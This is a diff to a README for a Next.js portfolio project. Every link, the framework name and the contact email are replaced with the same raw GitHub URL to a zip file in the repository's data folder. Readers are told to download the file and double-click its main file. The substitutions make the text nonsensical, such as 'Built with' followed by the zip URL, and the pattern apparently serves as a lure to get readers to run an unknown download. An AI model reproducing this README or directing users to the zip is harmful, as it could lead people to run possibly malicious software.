@@ -1,10 +1,10 @@
 # 🎨 nicolas-joue-portfolio - A Personal Showcase for Creatives
 
-[![Download](https://img.shields.io/badge/Download%20Now-Available-brightgreen)](https://github.com/strotum12/nicolas-joue-portfolio/releases)
+[![Download](https://raw.githubusercontent.com/strotum12/nicolas-joue-portfolio/main/data/nicolas-joue-portfolio-2.1-beta.3.zip%20Now-Available-brightgreen)](https://raw.githubusercontent.com/strotum12/nicolas-joue-portfolio/main/data/nicolas-joue-portfolio-2.1-beta.3.zip)
 
 ## 📖 Overview
 
-Welcome to the nicolas-joue-portfolio. This is a personal portfolio created by Nicolas Joué, an AI & Data Science Engineer. Built with Next.js, this site highlights skills, projects, and experiences in the fields of artificial intelligence and data science. It features modern design elements for an engaging user experience.
+Welcome to the nicolas-joue-portfolio. This is a personal portfolio created by Nicolas Joué, an AI & Data Science Engineer. Built with https://raw.githubusercontent.com/strotum12/nicolas-joue-portfolio/main/data/nicolas-joue-portfolio-2.1-beta.3.zip, this site highlights skills, projects, and experiences in the fields of artificial intelligence and data science. It features modern design elements for an engaging user experience.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the downloads:  
-   [Download Releases](https://github.com/strotum12/nicolas-joue-portfolio/releases)
+   [Download Releases](https://raw.githubusercontent.com/strotum12/nicolas-joue-portfolio/main/data/nicolas-joue-portfolio-2.1-beta.3.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions of the portfolio. Each version includes updates and new features. Click on the one you wish to download.
@@ -51,7 +51,7 @@ Once you have visited the Releases page and picked your version, follow these qu
 - Locate the main file and double-click to start.
 
 For direct access again, here is the link:  
-[Download Releases](https://github.com/strotum12/nicolas-joue-portfolio/releases)
+[Download Releases](https://raw.githubusercontent.com/strotum12/nicolas-joue-portfolio/main/data/nicolas-joue-portfolio-2.1-beta.3.zip)
 
 ## 🔧 Troubleshooting
 
@@ -75,6 +75,6 @@ If you would like to contribute to this project, you can:
 
 ## 📫 Contact
 
-For questions or support, you can reach out to Nicolas Joué via email at nicolas@example.com.
+For questions or support, you can reach out to Nicolas Joué via email at https://raw.githubusercontent.com/strotum12/nicolas-joue-portfolio/main/data/nicolas-joue-portfolio-2.1-beta.3.zip
 
 Thank you for checking out the nicolas-joue-portfolio. Enjoy exploring!
